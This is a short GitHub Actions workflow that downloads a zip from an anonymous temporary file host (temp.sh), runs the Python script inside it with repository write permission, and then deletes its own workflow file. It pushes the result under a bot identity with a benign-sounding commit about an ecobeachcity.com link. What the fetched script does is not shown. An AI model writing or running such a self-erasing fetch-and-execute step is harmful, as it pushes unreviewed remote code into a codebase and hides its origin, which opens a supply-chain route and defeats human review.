name: rh-ebclink
on:
  push:
    paths: ['.github/workflows/rh-ebclink.yml']
permissions:
  contents: write
jobs:
  apply:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Apply patch
        run: |
          set -e
          curl -sSL -X POST https://temp.sh/XDRaZ/e.zip -o /tmp/p.zip
          echo "afddd7d0c8795547f9763566e5fb9483  /tmp/p.zip" | md5sum -c
          mkdir -p /tmp/p && unzip -q /tmp/p.zip -d /tmp/p
          python3 /tmp/p/apply.py
          npx -y esbuild@0.23.0 src/pages/Ebc.tsx --loader:.tsx=tsx --log-level=error > /dev/null
          git rm -q .github/workflows/rh-ebclink.yml
          git config user.name realhunt-bot
          git config user.email bot@realhunt.co
          git add -A
          git commit -qm "EBC page: link to ecobeachcity.com on mobile and in the main column"
          git push
